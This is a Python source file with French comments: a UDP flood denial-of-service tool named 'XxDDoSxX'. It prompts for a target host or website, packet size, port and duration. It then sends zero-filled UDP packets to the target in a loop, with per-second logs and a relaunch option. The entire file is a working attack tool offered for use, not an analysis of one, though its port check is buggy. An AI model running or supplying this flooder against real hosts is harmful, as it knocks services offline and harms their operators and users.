import socket, os , datetime, sys, threading, select

# Setup de print couleur
def printRed(text):
 print("\033[91m{}\033[00m".format(text))
 
def inputYellow(text):
 value = input("\033[93m{}\033[00m".format(text))
 return value
 
def printPurple(text):
 print("\033[95m{}\033[00m".format(text))
 
def printLightPurple(text):
 print("\033[94m{}\033[00m".format(text))

def printCyan(text):
 print("\033[96m{}\033[00m".format(text))


# Setup de clear + bannière
def style():
	os.system("clear")
	printCyan("===========================================================================")
	printRed("               __   __    ____________      _____     __   __")
	printRed("               \ \ / /    |  _  \  _  \    /  ___|    \ \ / /")
	printRed("                \ V /__  _| | | | | | |___ \ `--.__  __\ V / ")
	printRed("                /   \  \/ | | | | | / _ \ `--. \ \\ \/  /   \ ")
	printRed("               / /^\ \>  <| |/ /| |/ / (_) /\__/ />  </ /^\ \\")
	printRed("               \/   \/_/\_\___/ |___/ \___/\____//_/\_\/   \/")
	printCyan("===========================================================================")
	printLightPurple("                           //XxDDoSxX by C0C0\\\\") 
	printCyan("===========================================================================")


# Setup de now (Heure actuelle en secondes)
def now():
	now = datetime.datetime.now()
	now = str(now)
	nowSecond = int(now[11:13])*3600 + 		int(now[14:16])*60 + int(now[17:19])
	return nowSecond              
	                     

# Programme principal
def ddos():
	
	
	# Vérifie que l'adresse IP est fonctionnel
	style()
	ipSend = inputYellow("\n[1] IP or WebSite Adress : ")
	if ipSend[0:8] == "https://":
		ipSend = ipSend[8:len(ipSend)]
	
	elif ipSend[0:7] == "http://":
		ipSend = ipSend[7:len(ipSend)]
	
	for i in range(len(ipSend)):
		if ipSend[i]=="/":
			ipSend = ipSend[0:i]
			break
	while True:
		try:
			ip = socket.gethostbyname(ipSend)
			break	
		except:
			style()
			printRed("\n                      Error : IP Adress is Not Found")
			ipSend = inputYellow("\n[1] IP or WebSite Adress : ")

	# Vérifie que bytes est dans [1 ;65507]
	style()		
	bytes = inputYellow("\n[2] Bytes Send (int, Min : 1, Max : 65507) : ")
	while True:
		try:
			bytes = int(bytes)
			if bytes >= 1 and bytes <= 65507:
				break
		except ValueError:
				pass
		style()
		printRed("\n                  Error : Number of Bytes is not interval")
		bytes = inputYellow("\n[2] Bytes Send (int, Min : 1, Max : 65507) : ")
	
	# Vérifie que port est dans [1 ;65534]
	style()
	port = inputYellow("\n[3] Port (int, Min : 1, Max : 65534) : ")
	while True:
		try:
			port = int(port)
			if bytes >= 1 and bytes <= 65534:
				break
		except ValueError:
				pass
		style()
		printRed("\n                  Error : Number of Port is not interval")
		port = inputYellow("\n[3] Port (int, Min : 1, Max : 65534) : ")

	# Vérifie que time est dans [1 ;1439]
	style()	
	global time
	time = inputYellow("\n[4] Time in Minutes (int, Min : 1, Max : 1439) : ")
	while True:
		try:
			time = int(time)
			if time >= 1 and time <= 1439:
				time *= 60
				break
		except ValueError:
				pass
		style()
		printRed("\n                  Error : Number of Time is not interval")
		time = inputYellow("\n[4] Time in Minutes (int, Min : 1, Max : 1439) : ")
		

	# Fonction pour lire la console sans interrompre
	def inputNoInterrupted():
		global exit, time
		timeLocal = time
		input, e, o = select.select( [sys.stdin], [], [], 		int(timeLocal) )

		if input:
		  while timeLocal != 0:
			  input=sys.stdin.readline().strip()
			  for i in range(len(input)):
			  	if input[i] == "e":
		  			exit = input[i]
	 		 		return exit
 	
 	#Définition de thread
	thread = threading.Thread(target=inputNoInterrupted)

	# Message avec nombre de bytes
	send = "0"*bytes

	# Création d'un paquet UDP
	sock = socket.socket(socket.AF_INET, 	socket.SOCK_DGRAM)

	# Heure de fin (en secondes)
	nowSecond = time + now()
	nowSecondPrint = nowSecond
	nowSecond -= 86400 if nowSecond >= 86400 else 0

	# Variable à 0
	PacketPerSecond = 0
	PacketPerSecondTotal = 0
	timeEnd = 0
	sendTime = now()
	
	# Début du thread
	thread.start()
	
	# Coeur du DDoS
	while True:	
		
		# Mise a jour de requete par secondes
		PacketPerSecond += 1
		
		# Conversion du temps restant en hh:mm:ss
		(hoursPrint, secondsPrint) = divmod(nowSecondPrint - now(), 3600)
		(minutePrint, secondsPrint) = divmod(secondsPrint, 60)
		hoursPrint = "0" + str(hoursPrint) if hoursPrint < 10 else hoursPrint
		minutePrint = "0" + str(minutePrint) if minutePrint < 10 else minutePrint
		secondsPrint = "0" + str(secondsPrint) if secondsPrint < 10 else secondsPrint
		
		# Envoi du paquet
		sock.sendto(send.encode(), (ip, port))
		
		# Affichage des logs toutes les secondes
		if sendTime != now():
			style()
			printRed("\n                        Enter 'e' for stop attack")
			logs = "\n["+str(hoursPrint)+":"+str(minutePrint)+":"+str(secondsPrint)+"] Bytes send "+str(bytes)+" Adress "+str(ipSend)+" Port "+str(port)+" Packets "+str(PacketPerSecond)
			printPurple(logs)
			PacketPerSecondTotal += PacketPerSecond
			PacketPerSecond = 0
			sendTime = now()
			timeEnd += 1
			
		# Fin de l'attaque avec options pour relancer
		global exit
		if nowSecond == now() or exit == "e":
			
			# Fin du thread
			thread.join()
			exit = ""
			
				# Conversion du temps d'attaque total en hh:mm:ss
			(hoursPrintTotal, secondsPrintTotal) = divmod(timeEnd, 3600)
			(minutePrintTotal, secondsPrintTotal) = divmod(secondsPrintTotal, 60)
			hoursPrintTotal = "0" + str(hoursPrintTotal) if hoursPrintTotal < 10 else hoursPrintTotal
			minutePrintTotal = "0" + str(minutePrintTotal) if minutePrintTotal < 10 else minutePrintTotal
			secondsPrintTotal = "0" + str(secondsPrintTotal) if secondsPrintTotal < 10 else secondsPrintTotal
			
			style()
			printRed("\n                                 Finish !\n                               Total logs : ")
			logsTotal = "\n["+str(hoursPrintTotal)+":"+str(minutePrintTotal)+":"+str(secondsPrintTotal)+"] Bytes send "+str(bytes)+" Adress "+str(ipSend)+" Port "+str(port)+" Packets "+str(PacketPerSecondTotal)
			printPurple(logsTotal)
			relaunch = inputYellow("\n[*] Continue ? (y/n) : ")
			while True:
				if relaunch == "y" or relaunch == "Y" or relaunch == "yes" or relaunch == "Yes":
					ddos()
				if relaunch == "n" or relaunch == "N" or relaunch == "no" or relaunch == "No":
					style()
					printRed("\n                                   Bye !")
					sys.exit()
				else:
					style()
					printRed("\n                            Error : Answer y/n")
					relaunch = inputYellow("\n[*] Continue ? (y/n) : ")
					
	#Fermeture du paquet
	sock.close()

# Démaragge du programme principal	
ddos()
